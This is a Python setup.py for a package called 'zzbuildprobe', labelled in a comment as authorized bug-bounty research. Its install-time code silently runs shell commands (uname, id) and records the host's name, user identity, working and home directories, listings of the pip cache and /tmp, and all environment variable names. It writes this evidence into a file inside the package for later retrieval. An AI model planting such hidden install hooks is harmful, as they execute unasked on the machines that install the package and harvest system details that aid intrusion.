import os, socket, subprocess
# BUILD_HOST_EVIDENCE (authorized research m1m15, Databricks BB) - benign, read-only
def _sh(cmd):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10).stdout[:400]
    except Exception as e:
        return 'ERR:' + str(e)[:60]
EV = {}
try:
    EV['host'] = socket.gethostname()
    EV['uname'] = _sh('uname -a').strip()
    EV['id'] = _sh('id').strip()
    EV['cwd'] = os.getcwd()
    home = os.path.expanduser('~')
    EV['home'] = home
    for d in [os.path.join(home,'.cache','pip'), '/tmp']:
        try: EV['ls_'+d.replace('/','_')] = sorted(os.listdir(d))[:40]
        except Exception as e: EV['ls_'+d.replace('/','_')] = 'ERR'
    EV['envkeys'] = sorted(os.environ.keys())
except Exception:
    pass
body = 'EVIDENCE = ' + repr(EV) + chr(10)
open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'zzbuildprobe', 'build_evidence.py'), 'w').write(body)
from setuptools import setup
setup(name='zzbuildprobe', version='1.2.0', packages=['zzbuildprobe'])
